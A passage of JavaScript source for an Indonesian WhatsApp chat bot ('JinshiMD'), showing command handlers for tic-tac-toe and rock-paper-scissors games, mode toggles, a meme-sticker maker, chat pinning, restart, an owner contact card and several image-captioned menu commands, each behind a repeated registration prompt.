            if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replyviex(`Kamu Masih Dalam Permainan\n> KETIK .delttc UNTUK KELUAR PERMAINAN`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room13.game.currentTurn.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengakui kekalahan`
            if (room13.x !== room13.o) await TradzSigma.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await TradzSigma.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replyviex('Tag pasangan ttc\n> Contoh: .ttc @dinz' + (text ? `\n\n𝗧𝗘𝗞𝗦 𝗗𝗜 𝗔𝗧𝗔𝗦 𝗔𝗕𝗔𝗜𝗞𝗔𝗡 𝗦𝗔𝗝𝗔\n YANG DITAG WAJIB KETIK *${prefix}${command}* UNTUK BERMAIN` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            TradzSigma.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replyviex(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replyviex('damaged')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replyviex(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replyviex(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return replyviex(`_Who do you want to challenge?_\nTag the person..\n\nContoh : .suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replyviex(`Orang yang Anda tantang sedang bermain sesuai dengan orang lain :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Silahkan ketik accept untuk menerima atau ketik reject untuk menolak*`
            this.suit[id] = {
            chat: await TradzSigma.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) TradzSigma.sendText(m.chat, `_𝙒𝘼𝙆𝙏𝙐 𝙎𝙐𝙄𝙏 𝙃𝘼𝘽𝙄𝙎_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break 
        	break 
	case 'public': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!TradID) return replyviex(mess.only.owner)
TradzSigma.public = true
replyviex('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')            
if (!TradID) return replyviex(mess.only.owner)
TradzSigma.public = false
replyviex('*Sukses*')
            }
            break

case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replyviex(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await TradzSigma.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
TradzSigma.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
memek = await TradzSigma.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
TradzSigma.sendMessage(m.chat, { react: { text: '✔️', key: m.key }})
} else {
replyviex(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
}
}
break
//case 'smeme': case 'stickermeme': case 'smeme': {
//TradzSigma.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
			//	if (!/webp/.test(mime) && /image/.test(mime)) {
		//			if (!text) return replyDinzID(`Penggunaan: ${prefix + command} teks_atas|teks_bawah`);
		
				//	atas = text.split('|')[0] ? text.split('|')[0] : '';
		//			bawah = text.split('|')[1] ? text.split('|')[1] : '';
		
	//				let mee = await TradzSigma.downloadAndSaveMediaMessage(quoted);
				//	let mem = await CatBox(mee);
			//		let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`;
		
			//		await TradzSigma.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author });
		//		} else {
			//		replyDinzID(`Kirim atau balas gambar dengan caption ${prefix + command} teks_atas|teks_bawah untuk membuat meme!`);
				//}
		//	}
		//	break;

case 'jadibot': {
     replyviex('fitur ini tersedia di next update')
}
break     
case 'listjadibot': 
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
try {
let user = [... new Set([...global.conns.filter(TradzSigma => TradzSigma.user).map(TradzSigma => TradzSigma.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await TradzSigma.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
TradzSigma.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replyviex(`Belum ada pengguna yang menyewa bot`)
}
break
case 'clearall': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!TradID) return replyviex(mess.only.owner)
TradzSigma.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!TradID) return replyviex(mess.only.owner)
if (m.isGroup) return replyviex(mess.only.private)
TradzSigma.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!TradID) return replyviex(mess.only.owner)
if (m.isGroup) return replyviex(mess.only.private)
TradzSigma.chatModify({ pin: false }, m.chat)
}
break
case 'restart':
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!TradID) return replyviex(mess.only.owner)
replyviex(`restarting ${global.namabot}`)
replyviex(`Succes`)
await sleep(3000)
process.exit()
break
case 'totalfitur':{
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
replyviex(`📱Total Fitur Bot : ${totalfitur()}`)
}
        break
case 'owner': case 'developer': case 'dev': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
try {
let ppuser;
try {
ppuser = await TradzSigma.profilePictureUrl(global.owner + '@s.whatsapp.net', 'image');
} catch (err) {
ppuser = 'https://files.catbox.moe/yng1lr.jpg'; }
const kontak = {
"displayName": 'Tradz Dev︎',
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.ownername}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.ownername}@gmail.com\nORG: INI OWNER\nEND:VCARD` };
await TradzSigma.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo: {
forwardingScore: 999,
isForwarded: false,
mentionedJid: [sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": "owner ku tercinta",  
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": await getBuffer(ppuser), 
"mediaUrl": ppuser, 
"sourceUrl": "https://whatsapp.com/channel/0029Vb5tjub8F2p55FXaN80p" }}
}, { quoted: m });
} catch (err) {
console.log(err);
replyviex("Terjadi kesalahan saat mengirim kontak owner.")}
}
break
//=========================================\\

case 'domainmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOMAIN MENU* )▭▬▭

⭔ ${prefix}subdomain 

 Powered By *${ownername}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
TradzSigma.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/49f2b139a2aff4bb934f7.jpg',
sourceUrl: global.my.ch,
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
}
break

case 'gamemenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
   let DinzID_sad = `${gamemenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/mhcye4.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break

case 'cpanelmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
   let DinzID_sad = `${cpanelmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/6xp210.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'storemenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${storemenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/k0nzyx.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'quotesmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${quotesmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/w95m1c.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'anonymousmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${anonymousmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/p7ijg3.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'islamimenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${islamimenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/mhcye4.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break

case 'rpgmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${rpgmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/m9vnij.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break

case 'ownermenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${ ownermenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/1jypou.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'pushmenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${ pushmenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `${global.ownername}`,
newsletterJid: `120363401647250932@newsletter`, },
      externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/8bmsmh.jpg",
sourceUrl: "https://instagram.com/dinzid_04"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'othermenu': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  let DinzID_sad = `${othermenu(prefix, hituet)}`
TradzSigma.sendMessage(m.chat, {
      image: fs.readFileSync('./library/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
